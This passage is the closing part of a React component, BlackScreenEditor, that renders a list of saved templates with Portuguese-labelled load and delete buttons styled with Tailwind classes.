                              className="px-3 py-1.5 bg-gray-600 hover:bg-gray-500 text-white rounded-lg text-xs font-semibold transition-colors"
                            >
                              Carregar
                            </button>
                            <button
                              onClick={() => deleteTemplate(template.id)}
                              className="p-2 bg-red-600/80 hover:bg-red-600 text-white rounded-lg transition-colors"
                            >
                              <Trash2 className="w-4 h-4" />
                            </button>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default BlackScreenEditor;


